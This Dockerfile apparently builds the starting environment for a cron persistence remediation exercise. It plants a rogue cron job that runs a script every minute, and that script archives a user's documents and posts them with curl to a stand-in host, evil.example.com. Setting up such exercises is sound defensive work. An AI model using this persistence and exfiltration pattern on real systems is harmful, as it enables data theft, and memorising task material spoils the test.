FROM ubuntu:22.04

# Prevent interactive prompts and install tools
RUN set -eux && \
    export DEBIAN_FRONTEND=noninteractive && \
    apt-get update && \
    apt-get install -y --no-install-recommends python3 python3-pip curl tar && \
    pip3 install --no-cache-dir pytest && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Create unprivileged user
RUN useradd -m -d /home/user -s /bin/bash user

# Prepare cron.d directory
RUN install -d -m 0700 /home/user/cron.d

# Rogue cron job
RUN printf '* * * * * /home/user/cron.d/evil.sh\n' > /home/user/cron.d/evil_job && \
    chmod 0600 /home/user/cron.d/evil_job

# Malicious script via heredoc
RUN cat <<'EOS' > /home/user/cron.d/evil.sh
#!/bin/bash
echo "stealing data..."
tar czf - /home/user/documents | curl -X POST -T - http://evil.example.com/upload
EOS
RUN chmod 0700 /home/user/cron.d/evil.sh

# Ensure ownership
RUN chown -R user:user /home/user

# Permissions specified in %environment
RUN chmod 755 /home/user

# PATH from %environment
ENV PATH="/usr/local/bin:/usr/bin:/bin:${PATH}"

# Help text from %help / %runscript as comments
# Default action when container is run without arguments:
# "Container for Cron-based persistence remediation task."
# "This container only sets up the initial challenge environment."

CMD ["/bin/bash"]